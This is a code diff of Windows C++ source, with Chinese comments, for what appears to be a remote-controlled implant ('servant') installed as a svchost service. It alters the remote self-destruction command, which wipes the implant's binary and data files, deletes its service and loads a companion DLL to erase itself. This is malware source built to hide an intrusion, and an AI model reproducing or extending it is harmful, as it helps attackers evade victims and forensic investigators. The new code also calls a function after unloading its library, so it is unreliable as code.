@@ -2,10 +2,10 @@
 #include <time.h>
 #include <wininet.h>
 #include <process.h>
+#include "common.h"
 #include "socket/MySocket.h"
 #include "file/MyFile.h"
 #include "destruction/SelfDestruction.h"
-#include "../../pub/ShellInclude.h"
 #include "BinNames.h"
 #include "common.h"
 #include "main.h"
@@ -110,7 +110,7 @@ __time64_t Manager::GetInstallTime()
 	if (s_insttime > 0) return s_insttime;
 
 	//准备文件路径
-	tstring datFilepath = GetLocalPath();
+	tstring datFilepath = GetBinFilepath();
 	datFilepath += SERVANT_DATA_FILENAME;
 
 	//读取安装时间
@@ -749,12 +749,12 @@ BOOL Manager::ExecuteRCCommand_SelfDestruction( MSGID msgid, const LPBYTE data, 
 	TStringVector tocleanList;
 
 	//将servant加入清理列表
-	tstring coreFilepath = GetLocalPath();
+	tstring coreFilepath = GetBinFilepath();
 	coreFilepath += SERVANT_CORE_BINNAME;
 	tocleanList.push_back(coreFilepath);
 
 	//将数据文件加入清理列表
-	tstring servantDataFilepath = GetLocalPath();
+	tstring servantDataFilepath = GetBinFilepath();
 	servantDataFilepath += SERVANT_DATA_FILENAME;
 	tocleanList.push_back(servantDataFilepath);
 
@@ -766,18 +766,22 @@ BOOL Manager::ExecuteRCCommand_SelfDestruction( MSGID msgid, const LPBYTE data, 
 		SelfDestruction::CleanFile(iter->c_str());
 		SelfDestruction::DeleteFileIgnoreReadonly(iter->c_str());
 	}
-
-	//调用servantshell的接口，进行服务销毁和servantshell.dll的销毁
-
-	//清理服务
-	PSERVICE_INFO info;
-	GetSvrInfo(&info);
-
-	ServiceManager::GetInstanceRef().DeleteSvchostService(a2t(info->szServiceName), SERVANT_SVCHOST_NAME);
+	
+	ServiceManager::GetInstanceRef().DeleteSvchostService(a2t(g_ServiceInfo.szServiceName), SERVANT_SVCHOST_NAME);
 	DeinitServant();
 
-	debugLog(_T("stop service"));
-	ServiceManager::GetInstanceRef().StopService(a2t(info->szServiceName), SERVANT_SVCHOST_NAME);
+
+	//清理SERVANT_SHELL_BINNAME
+	tstring shellPath = GetBinFilepath();
+	shellPath += SERVANT_SHELL_BINNAME;
+
+	HMODULE hMod = LoadLibrary(shellPath.c_str());
+
+	typedef void (*fnSD)();
+
+	fnSD SD = (fnSD)GetProcAddress(hMod,"SD");
+
+	FreeLibrary(hMod);
 
 	SD();
 
